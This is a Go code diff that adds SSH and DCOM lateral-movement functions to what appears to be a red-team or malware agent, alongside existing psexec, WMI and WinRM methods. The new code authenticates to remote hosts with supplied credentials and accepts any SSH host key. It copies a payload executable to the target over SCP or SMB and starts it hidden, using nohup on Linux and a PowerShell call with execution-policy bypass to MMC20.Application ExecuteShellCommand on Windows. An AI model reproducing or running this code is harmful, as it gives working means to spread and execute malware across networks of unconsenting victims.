@@ -4,12 +4,14 @@ package agent
 
 import (
 	"fmt"
+	"net"
 	"os"
 	"strings"
 	"syscall"
 	"time"
 	"unsafe"
 
+	"golang.org/x/crypto/ssh"
 	"golang.org/x/sys/windows"
 )
 
@@ -210,7 +212,130 @@ func lateralWinRM(host string, data []byte, svcName, user, pass string) (string,
 	return fmt.Sprintf("[+] winrm → %s\n    path: %s\n%s", host, localPath, strings.TrimSpace(out)), nil
 }
 
-// ── dispatcher ──────────────────���───────────────────────────��─────────────────
+// ── SSH lateral ───────────────────────────────────────────────────────────────
+
+// lateralSSH stages the payload via SCP and executes it over SSH.
+// Uses golang.org/x/crypto/ssh for pure-Go SSH without external binaries.
+func lateralSSH(host string, data []byte, svcName, user, pass string) (string, error) {
+	if svcName == "" {
+		svcName = randSvcName()
+	}
+	exeName := svcName + ".exe"
+
+	// ── connect ───────────────────────────────────────────────────────────────
+	addr := host
+	if !strings.Contains(host, ":") {
+		addr = host + ":22"
+	}
+	cfg := &ssh.ClientConfig{
+		User: user,
+		Auth: []ssh.AuthMethod{ssh.Password(pass)},
+		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
+			return nil // accept any host key (red team context)
+		},
+		Timeout: 10 * time.Second,
+	}
+	client, err := ssh.Dial("tcp", addr, cfg)
+	if err != nil {
+		return "", fmt.Errorf("ssh lateral dial %s: %w", addr, err)
+	}
+	defer client.Close()
+
+	// ── stage via SCP (inline, no scp binary required) ───────────────────────
+	remotePath := `/tmp/` + exeName
+	if err := scpUpload(client, data, remotePath); err != nil {
+		return "", fmt.Errorf("ssh lateral scp: %w", err)
+	}
+
+	// ── execute ───────────────────────────────────────────────────────────────
+	sess, err := client.NewSession()
+	if err != nil {
+		return "", fmt.Errorf("ssh lateral session: %w", err)
+	}
+	defer sess.Close()
+
+	cmd := fmt.Sprintf("chmod +x %s && nohup %s </dev/null >/dev/null 2>&1 &", remotePath, remotePath)
+	out, _ := sess.CombinedOutput(cmd)
+	return fmt.Sprintf("[+] ssh → %s\n    path: %s\n%s", host, remotePath, strings.TrimSpace(string(out))), nil
+}
+
+// scpUpload sends data to remotePath on the SSH server using the SCP protocol.
+func scpUpload(client *ssh.Client, data []byte, remotePath string) error {
+	sess, err := client.NewSession()
+	if err != nil {
+		return err
+	}
+	defer sess.Close()
+
+	w, err := sess.StdinPipe()
+	if err != nil {
+		return err
+	}
+
+	dir := remotePath[:strings.LastIndex(remotePath, "/")+1]
+	base := remotePath[strings.LastIndex(remotePath, "/")+1:]
+
+	errCh := make(chan error, 1)
+	go func() {
+		defer w.Close()
+		_, e := fmt.Fprintf(w, "C0755 %d %s\n", len(data), base)
+		if e != nil {
+			errCh <- e
+			return
+		}
+		_, e = w.Write(data)
+		if e != nil {
+			errCh <- e
+			return
+		}
+		w.Write([]byte{0})
+		errCh <- nil
+	}()
+
+	if err := sess.Run(fmt.Sprintf("scp -qt %s", dir)); err != nil {
+		<-errCh
+		return err
+	}
+	return <-errCh
+}
+
+// ── DCOM lateral ──────────────────────────────────────────────────────────────
+
+// lateralDCOM stages data via SMB and executes it using DCOM MMC20.Application.
+// This uses PowerShell's [activator]::CreateInstance to call ExecuteShellCommand
+// on the remote MMC20.Application COM object — no direct WMI, no SCM.
+func lateralDCOM(host string, data []byte, svcName, user, pass string) (string, error) {
+	if svcName == "" {
+		svcName = randSvcName()
+	}
+	exeName := svcName + ".exe"
+
+	lateralAuth(host, user, pass)
+
+	localPath, err := smbStage(host, exeName, data)
+	if err != nil {
+		return "", fmt.Errorf("dcom: %w", err)
+	}
+
+	// MMC20.Application via PowerShell — works without local admin on target
+	// (only requires DCOM access, which Domain Admins have by default)
+	safePath := strings.ReplaceAll(localPath, `'`, `''`)
+	psCmd := fmt.Sprintf(
+		`$c=[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","%s"));`+
+			`$c.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c start /B '%s'","7")`,
+		host, safePath,
+	)
+	cmd := fmt.Sprintf(`powershell -NoP -W Hidden -Exec Bypass -C "%s"`,
+		strings.ReplaceAll(psCmd, `"`, `\"`))
+
+	out, err := runShell(cmd)
+	if err != nil {
+		return out, fmt.Errorf("dcom %s: %s: %w", host, strings.TrimSpace(out), err)
+	}
+	return fmt.Sprintf("[+] dcom → %s\n    path: %s\n%s", host, localPath, strings.TrimSpace(out)), nil
+}
+
+// ── dispatcher ────────────────────────────────────────────────────────────────
 
 // runLateral dispatches to the chosen lateral movement method.
 func runLateral(method, host string, data []byte, svcName, user, pass string) (string, error) {
@@ -221,7 +346,11 @@ func runLateral(method, host string, data []byte, svcName, user, pass string) (s
 		return lateralWMI(host, data, svcName, user, pass)
 	case "winrm":
 		return lateralWinRM(host, data, svcName, user, pass)
+	case "ssh":
+		return lateralSSH(host, data, svcName, user, pass)
+	case "dcom":
+		return lateralDCOM(host, data, svcName, user, pass)
 	default:
-		return "", fmt.Errorf("unknown method %q — use psexec, wmi, or winrm", method)
+		return "", fmt.Errorf("unknown method %q — use psexec, wmi, winrm, ssh, dcom", method)
 	}
 }
